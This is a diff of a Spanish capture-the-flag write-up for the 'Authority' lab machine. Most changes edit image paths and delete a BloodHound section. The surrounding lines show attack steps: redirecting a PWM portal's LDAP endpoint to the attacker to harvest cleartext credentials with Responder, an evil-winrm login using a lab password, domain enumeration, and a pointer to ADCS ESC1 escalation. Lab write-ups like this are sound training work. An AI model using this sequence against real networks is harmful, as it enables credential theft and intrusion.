@@ -198,9 +198,11 @@ ansible-vault decrypt ldap_admin.hash      --vault-password-file vault_pass.txt
 
 Accedemos al portal **PWM** en `https://$IP:8443` con las credenciales obtenidas:
 
-![PWM Login](/assets/img/authority_pwm_login.png)
+![PWM Login](/assets/img/Authority/web.png)
 
-![PWM Dashboard](/assets/img/authority_pwm_dash.png)
+Bien vamos ingresar esas credenciales.
+
+![PWM Dashboard](/assets/img/Authority/config.png)
 
 Descargamos la configuración LDAP actual y modificamos el endpoint para redirigirlo a
 nuestra máquina:
@@ -221,7 +223,7 @@ sudo responder -I tun0
 
 Importamos la configuración en el portal:
 
-![PWM Import](/assets/img/authority_pwm_import.png)
+![PWM Import](/assets/img/Authority/portal.png)
 
 **Responder** captura las credenciales en texto claro:
 
@@ -248,8 +250,6 @@ WINRM  10.129.12.64  5985  AUTHORITY  [+] authority.htb\svc_ldap:lDaP_1n_th3_cle
 evil-winrm -i $IP -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
 ```
 
-![Evil-WinRM](/assets/img/authority_winrm.png)
-
 ### Flag de usuario
 
 ```powershell
@@ -268,16 +268,6 @@ la escalada debe ser técnica:
 *Evil-WinRM* PS C:\Users\svc_ldap> net users /domain
 Administrator  Guest  krbtgt  svc_ldap
 ```
-
-### Análisis de Dominio - BloodHound
-
-```bash
-bloodhound-ce-python -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d authority.htb -ns $IP -c All --zip
-```
-
-BloodHound confirma que la ruta de escalada pasa por **ADCS**:
-
-![BloodHound](/assets/img/authority_bloodhound.png)
 
 ### ESC1 — Template CorpVPN vulnerable
 
